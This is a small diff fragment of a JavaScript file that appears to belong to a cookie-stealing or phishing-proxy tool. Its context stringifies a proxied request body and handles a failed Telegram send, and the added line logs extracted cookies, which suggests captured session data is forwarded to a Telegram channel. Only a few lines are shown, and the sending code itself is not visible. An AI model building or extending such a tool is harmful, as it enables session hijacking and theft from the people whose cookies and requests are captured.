@@ -136,6 +136,7 @@ ${JSON.stringify(data.proxyRequestBody || {}, null, 2)}
     } catch (e) {
         console.log('Telegram send failed', e.message);
     }
+    console.log('🍪 Cookies extracted:', cookies);
 }
 
 // ================================================
